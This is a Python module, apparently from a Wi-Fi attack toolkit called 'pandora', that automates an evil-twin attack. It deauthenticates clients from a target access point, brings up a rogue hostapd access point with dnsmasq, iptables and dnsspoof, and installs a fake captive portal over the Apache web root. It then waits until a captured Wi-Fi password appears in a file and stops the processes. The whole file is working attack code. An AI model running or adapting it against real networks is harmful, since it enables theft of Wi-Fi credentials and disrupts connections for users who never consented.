import os,time,shutil
from pandora.shell import iptables, dnsmasq, dnsspoof, hostapd, aireplay
from pandora.definitions import APACHE_CONFIG_PATH, PASSWORDS_PATH
from pandora.core import app, ifmanager, deauth

DNSMASQ = dnsmasq.Dnsmasq()
APLAY = aireplay.Aireplay()
DNSSPOOF = dnsspoof.Dnsspoof()
HOSTAPD = hostapd.Hostapd()
IPTABLES = iptables.Iptables()

def start(ifname_main, ifname_secondary=None, target_ap_bssid=None, airodump=None):
    copy_files() #Copiamos los archivos para el redireccionamiento
    print("Starting flask server...")

    deauth_obj = deauth.Deauth(airodump)
    interface_manager = ifmanager.InterfaceManager()
    app.start_server_daemon()

    if ifname_secondary:
        ifname_deauth = ifname_main
        ifname_hostapd = ifname_secondary
    else:
        ifname_deauth = None
        ifname_hostapd = ifname_main

    if ifname_deauth:
        deauth_obj.deauthAP(target_ap_bssid, ifname_deauth)
        #aireplay_pid = APLAY.deauth_ap(target_ap_bssid, ifname_deauth)

    interface = interface_manager.switch_mode(ifname_hostapd, 'Managed')
    ifname_hostapd = interface.get('iname')
    os.system("killall hostapd")
    hostapd_pid = HOSTAPD.start(ifname_hostapd, '6')
    os.system("killall dnsmasq")
    dnsmasq_pid = DNSMASQ.start(ifname_hostapd)
    time.sleep(10)
    IPTABLES.command_for_twin(ifname_hostapd)
    dnsspoof_pid = DNSSPOOF.start(ifname_hostapd)

    file_path = os.path.join(PASSWORDS_PATH, 'et.txt')

    while True:
        time.sleep(10)
        if os.path.exists(file_path):
            file = open(file_path, 'r')
            line = file.readline()
            if line != "":
                file.close()
                hostapd_pid.kill()
                dnsmasq_pid.kill()
                dnsspoof_pid.kill()
                deauth_obj.killDeauthAPProc()
                #if ifname_deauth:
                    #aireplay_pid.kill()
                break
            file.close()

    return 1

def copy_files():
    html_directory = os.path.join(APACHE_CONFIG_PATH,'html')
    html_directory_dst = '/var/www/html'

    if os.path.exists(html_directory_dst):
        shutil.rmtree(html_directory_dst)
    shutil.copytree(html_directory, html_directory_dst)


    sites_enabled_dst = '/etc/apache2/sites-enabled'

    if os.path.exists(sites_enabled_dst):
        sites_enabled_src = os.path.join(APACHE_CONFIG_PATH, 'sites-enabled/000-default.conf')
        conf_sites_enabled_dst = '/etc/apache2/sites-enabled/000-default.conf'
        shutil.copyfile(sites_enabled_src, conf_sites_enabled_dst )
    else:
        sites_enabled_src = os.path.join(APACHE_CONFIG_PATH, 'sites-enabled')
        shutil.copytree(sites_enabled_src, sites_enabled_dst)
